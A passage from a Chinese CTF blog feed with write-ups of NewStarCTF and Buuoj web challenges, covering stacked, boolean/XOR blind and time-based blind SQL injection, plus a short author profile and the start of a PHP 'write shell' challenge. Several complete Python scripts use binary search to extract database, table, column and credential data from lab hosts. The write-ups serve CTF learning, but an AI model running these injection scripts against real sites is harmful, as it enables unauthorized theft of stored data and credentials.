sql_exe;#</span><br></pre></td></tr></table></figure><ul><li>设置sql语句=拼接u 和后面的语句</li><li>预处理sql_exe</li><li>执行sql_exe</li></ul><p>点击验证成绩即可，然后就能拿到flag</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `score` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure><p>查看分数</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/17.png" class title="堆叠注入，查看分数"><p>点击验证成绩就能获得flag</p><h3><span id="彩蛋"> 彩蛋</span></h3><p>这里如果修改的分数不一样的话，拿到flag的对话也是不一样的</p><p>修改成100分的结果如下</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/18.png" class title="获取flag"><p>修改成99999分的结果如下</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/19.png" class title="获取flag"><p><s>所以这个故事告诉我们不要把分数改的太大（雾）</s></p><h1><span id="newstarctf-week-4-又一个sql"> NewStarCTF Week 4： 又一个SQL</span></h1><p>异或/布尔盲注</p><h2><span id="打开靶机"> 打开靶机</span></h2><p>尝试性输入1 和 1’</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/20.png" class title="尝试联合注入"><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/21.png" class title="尝试联合注入"><p>果然，寄。没有回显位，没有报错信息。</p><p>我们常用的三种注入方式已经无效了，所以我们接下来要考虑盲注</p><p>由于输入1 和 1’的回显信息是好耶和啊哦（刚好是两种不同的信息）</p><p>我们这里输入0试试</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/22.png" class title="盲注测试"><p>发现输入0和输入1是两种不同的回显，这样我们就可以使用盲注了</p><h2><span id="异或运算"> 异或运算</span></h2><p>异或的运算有：</p><ul><li>1 ^ 1 = 0</li><li>1 ^ 0 = 1</li><li>0 ^ 0 = 0</li><li>0 ^ 1 = 1</li></ul><p>也就是说，两件事的异或运算中，如果有一真一假，就会输出1</p><p>如果两件都是真，则输出0</p><p>那么我们就可以通过异或运算构造sql语句查询</p><p><code>1^(length(database())=3)</code></p><p>注：如果过滤空格，则需要通过加括号的方式进行绕过，此题过滤了空格，所以要在length前加括号</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/24.png" class title="空格过滤"><p>如果数据库的名称长度为3，则为真 1^1 = 0，传的数据为0，回显为啊哦</p><p>如果数据库的名称长度不为3，则传的数据为1，回显为好耶</p><p>通过不断更改=后面的数字，可以得出数据库的长度</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/23.png" class title="盲注测试"><p>发现=3时，返回啊哦，则说明数据库长度为3，并且布尔/异或盲注可用~</p><p>接下来就是编写脚本的事情了</p><h2><span id="编写盲注脚本"> 编写盲注脚本</span></h2><p>采用二分法方式编写盲注脚本</p><h3><span id="啥是二分法方式"> 啥是二分法方式？</span></h3><p>emmm，盲注的原理是一个字符的ascii码数值与你的数值作比较，需要一个个进行比较输出</p><p>比如爆库的一个查询语句是1^(ascii(substr(database(),1,1))=100)</p><p>即数据库名称的第一个字符的ascii 与 100 比较，如果是100 即提交0，返回的值是啊哦</p><p>而二分法能够缩短这个过程（</p><p>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p><p>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p><p>如果某一步数组为空，则表示找不到目标元素。</p><p>大致意思是取第一个字符的ascii值和ascii（32，128）中间值，也就是80（刚好是常用的字段）作比较，如果ascii值大于中间值，从（80,132）的中间值比较,重复比较 直至ascii值相等。</p><h3><span id="结束一个判断的依据"> 结束一个判断的依据</span></h3><p>根据页面返回的信息不同，在我的情况中，如果返回的是啊哦，说明是1^1型，那么，啊哦就是正确的依据</p><h3><span id="python编写"> Python编写</span></h3><p>这里给出post / get请求的两种盲注的脚本（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;http://b4281729-cf5b-4705-81b6-74971a11b390.node4.buuoj.cn:81/comments.php&#x27;</span>  <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span> <span class="comment">#输出的结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span>    <span class="comment">#二分法固定的格式（  定好ascii的左右两端</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):    <span class="comment">#post请求，前面的name可以改为其他post传参的变量名</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>:<span class="string">&quot;1^(ascii(substr(database(),%d,1))&lt;%d)&quot;</span>%(i,mid)  <span class="comment">#循环传入i,mid  爆库</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)&quot;%(i,mid) #爆表</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;wfy_comments&quot;)),%d,1))&lt;%d)&quot;%(i,mid) #爆列</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d)&quot;%(i,mid) #读取内容</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d)&quot;%(i,mid) #读取内容，倒序输出</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        html=requests.post(url,data=payload) <span class="comment">#post传参，传入数据=payload内容</span></span><br><span class="line">        <span class="built_in">print</span>(payload) <span class="comment">#方便检测有没有问题</span></span><br><span class="line">        time.sleep(<span class="number">0.04</span>) <span class="comment">#防止buuoj.cn的429</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;啊哦&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span>  <span class="comment">#如果返回的不是啊哦，说明为假，例如&lt;80时为假,则需要+1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">#找到的值不存在时，退出</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)  <span class="comment">#小于号，需要-1</span></span><br><span class="line">    <span class="built_in">print</span>(res) <span class="comment">#输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res) <span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Result&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实你只要跑一次就知道为什么要-1了</p><p>最后一次输出的值是&lt;120，返回为真，但是我们此时的mid是120，真正的值是&lt;120</p><p>get传参也是如此</p><p><a href="http://xn--buuoj-xf6hi49xzo2alxd.cn">这里给出buuoj.cn</a> FinalSQL的盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys<span class="comment">#头文件</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1189e07b-be07-49cc-9b96-af07b0b4f9b0.node4.buuoj.cn:81/search.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">128</span></span><br><span class="line">        mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr(database(),%d,1))&lt;%d)#&quot;%(i,mid)#爆库</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)#&quot;%(i,mid)#爆表</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&lt;%d)#&quot;%(i,mid)#爆列</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(id,username,password))from(F1naI1y)),%d,1))&lt;%d)#&quot;%(i,mid) #爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                payload = url+<span class="string">&quot;1^(ascii(substr((select(reverse(group_concat(id,username,password)))from(F1naI1y)),%d,1))&lt;%d)#&quot;</span>%(i,mid) <span class="comment">#爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环，倒序输出</span></span><br><span class="line">                html = requests.get(payload)</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                time.sleep(<span class="number">0.04</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> html.text: <span class="comment">#这里写入的传参值是&lt; 返回的是ERROR才是对的反应</span></span><br><span class="line">                        right = mid <span class="comment">#如果有延时，右值取中值，再用左+右/2的新区间值与ascii比较(例如，第一次是ascii与80,如果小于80 用ascii与32+80/2=56比较)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        left = mid + <span class="number">1</span>  <span class="comment">#如果没有，左值取中值+1，取（81,132）中值比较，ascii值比mid值要大</span></span><br><span class="line">                mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">                <span class="keyword">break</span> <span class="comment">#防止超出ascii码值</span></span><br><span class="line">        res += <span class="built_in">chr</span>(mid-<span class="number">1</span>) <span class="comment">#小于号，值要-1</span></span><br><span class="line">        <span class="built_in">print</span>(res) <span class="comment">#打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"><span class="comment">#print(&quot;Final Result:&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们愉快的跑脚本就完事了</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/25.png" class title="爆破flag"><h1><span id="newstarctf-week-5-final-round"> NewStarCTF Week 5： Final Round</span></h1><p>延时盲注</p><p>题面提示：啊呜，好困呜呜（sleep）</p><h2><span id="进入靶机"> 进入靶机</span></h2><p>其实已经不用测什么方式注入了，sleep嘛，延时注入</p><p>测试语句：</p><p><code>114514||if(length(database())=3,sleep(0.2),1)</code></p><p>如果数据库名长度为3，休眠两秒再访问（</p><p>肉眼可见的延迟</p><h2><span id="编写脚本"> 编写脚本</span></h2><p>同样使用python脚本，同样也是post请求，同样也是二分法</p><p>套异或的就行了，只不过判断的方式有些不同</p><p>bool/异或 是根据1和0的两种回应来判断的，而time是根据访问的时间来进行访问的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr(database(),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #爆库</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_comments&#x27;)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #注意引号</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #同样的倒置输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        times = time.time() <span class="comment">#发送访问请求前的时间</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time() <span class="comment">#发送访问后的时间</span></span><br><span class="line">        keep = timee - times <span class="comment">#当然是大-小</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment">#防止429</span></span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">2</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) //<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Results:&quot;</span>,res) <span class="comment">#输出最终结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Results:&quot;,res[::-1]) #如果选择倒序，选这个</span></span><br></pre></td></tr></table></figure><p>然后就等吧… 啊呜，好困呜呜</p><p>睡一觉就把表跑完了，放心吧</p><p>记得renew 靶机</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/25.png" class title="一包烟，一杯酒，时间盲注跑一天"><p>睡了一觉，终于跑完了（我忘记开最后那个倒序重整了，所以flag是倒着的）</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/26.png" class title="一包烟，一杯酒，时间盲注跑一天"><p>flag{Ju2t_let_me_sleep_f0r_a_while}</p><hr><p>结束辣，好题，但是结束了才会做呜呜呜</p><p>看我摆烂的结果如何？</p><p>题目来自：<a href="http://buuoj.cn">buuoj.cn</a>  //NewStarsCTF</p><p>图片来自：截图</p><p>侵删qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摆烂大师的第一篇Web文章，qwq。检验我摆烂的水平的时间到了&lt;/p&gt;
&lt;p&gt;写写NewStarCTF的SQL注入题吧… 五周考了五个注入，考的点都不一样&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="SQL_Injection" scheme="http://example.com/tags/SQL-Injection/"/>
    
    <category term="POST" scheme="http://example.com/tags/POST/"/>
    
  </entry>
  
  <entry>
    <title>About Me</title>
    <link href="http://example.com/2022/11/07/Test/"/>
    <id>http://example.com/2022/11/07/Test/</id>
    <published>2022-11-07T14:27:49.000Z</published>
    <updated>2023-03-12T09:43:56.843Z</updated>
    
    <content type="html"><![CDATA[<p>Err0r233的自我介绍qwq</p><span id="more"></span><h2><span id="一个普通的摆烂哥普通到不能再普通"> 一个普通的摆烂哥，普通到不能再普通</span></h2><img src="/2022/11/07/Test/Texas.png" class title="This is an test image"><p>qwq，梦想是<s>做到一份非常简单的高考数学卷</s></p><p>不开玩笑了，真正的梦想是变得有钱qwq</p><p>练习时长两分钟的个人练习生，<s>甚至不能说是练过ctf的呜呜</s></p><p>啥也不会，留着摆烂</p><p>哈？没有摆烂的人生哪能叫做好人生啊</p><h2><span id="博客的内容"> 博客的内容</span></h2><ul><li>偶尔写写题解qwq(x)</li><li><strong>摆烂的时候写写东西用的</strong></li><li><s>Thai神的任务罢了</s></li><li>以上三点都是错的</li></ul><span class="blur">所以我要到什么时候才能有钱啊啊啊啊啊啊啊</span><h2><span id="friends"> Friends</span></h2><p>提供一下链接和头像就好了（雾）</p><p>图片来自：网络/鹰角网络叙拉古人cg</p><p>侵删qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Err0r233的自我介绍qwq&lt;/p&gt;</summary>
    
    
    
    <category term="Intro" scheme="http://example.com/categories/Intro/"/>
    
    
    <category term="Introduce_Myself" scheme="http://example.com/tags/Introduce-Myself/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj题目(4)</title>
    <link href="http://example.com/2022/02/01/Buuoj%E9%A2%98%E7%9B%AE-4/"/>
    <id>http://example.com/2022/02/01/Buuoj%E9%A2%98%E7%9B%AE-4/</id>
    <published>2022-02-01T03:28:18.000Z</published>
    <updated>2023-03-12T09:43:56.838Z</updated>
    
    <content type="html"><![CDATA[<p>做做buuoj上的web题，本萌新纯采集，轻喷（（（</p><span id="more"></span><h1><span id="wustctf2020颜值成绩查询"> [WUSTCTF2020]颜值成绩查询</span></h1><p>熟悉的查询框，输入数字查询成绩</p><p>尝试输入1’，显示学生不存在</p><p>所以普通的注入失败</p><p>尝试使用1^1，发现不存在</p><p>1^0发现是admin</p><p>所以使用布尔盲注即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys<span class="comment">#头文件</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://3fc79411-07ae-4931-9f8b-1fb09f15c605.node4.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">128</span></span><br><span class="line">        mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr(database(),%d,1))&lt;%d)#&quot;%(i,mid)#爆库</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)#&quot;%(i,mid)#爆表</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),%d,1))&lt;%d)#&quot;%(i,mid)#爆列</span></span><br><span class="line">                payload = url+<span class="string">&quot;1^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&lt;%d)#&quot;</span>%(i,mid) <span class="comment">#爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(reverse(group_concat(flag)))from(flag)),%d,1))&lt;%d)#&quot;%(i,mid) #爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                html = requests.get(payload)</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                time.sleep(<span class="number">0.04</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> html.text: <span class="comment">#这里写入的传参值是&lt; 返回的是ERROR才是对的反应</span></span><br><span class="line">                        right = mid <span class="comment">#如果有延时，右值取中值，再用左+右/2的新区间值与ascii比较(例如，第一次是ascii与80,如果小于80 用ascii与32+80/2=56比较)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        left = mid + <span class="number">1</span>  <span class="comment">#如果没有，左值取中值+1，取（81,132）中值比较，ascii值比mid值要大</span></span><br><span class="line">                mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">                <span class="keyword">break</span> <span class="comment">#防止超出ascii码值</span></span><br><span class="line">        res += <span class="built_in">chr</span>(mid-<span class="number">1</span>) <span class="comment">#小于号，值要-1</span></span><br><span class="line">        <span class="built_in">print</span>(res) <span class="comment">#打印</span></span><br><span class="line"><span class="comment">#print(&quot;Final Result:&quot;,res)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="红明谷ctf-2021write-shell"> [红明谷CTF 2021]write shell</span></h1><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#检测写入的语句是否匹配到上面的表达式，如果匹配，返回hacker</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#创建一个沙箱，如果$dir不存在，创建一个目录</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//action=pwd时，显示这个目录</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span 